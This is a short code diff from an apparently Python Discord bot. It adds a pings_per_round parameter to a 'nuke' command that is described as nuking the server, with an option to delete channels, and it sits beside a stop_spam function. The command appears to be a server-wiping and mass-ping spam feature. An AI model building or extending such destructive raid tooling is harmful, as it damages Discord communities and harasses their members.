@@ -244,11 +244,11 @@ async def stop_spam(interation, index: int, type: int):
     name='nuke',
     description='Nukes the server | usable by yayblaze only'
 )
-async def nuke(interation, deletechannels: bool):
+async def nuke(interation, deletechannels: bool, pings_per_round: int):
     if interation.user.id != 749431660168216650: return await interation.response.send_message(content="You don't have the perms to do that (L)", ephemeral=True)
     elif get_nuke_toggle(): return await interation.response.send_message(content="The nuke is already running!")
     print(time.asctime(time.localtime()),": Nuke Command Run")
-    await start_nuke(interation, deletechannels)
+    await start_nuke(interation, deletechannels, pings_per_round)
  
 #main entry point
 def main() -> None:
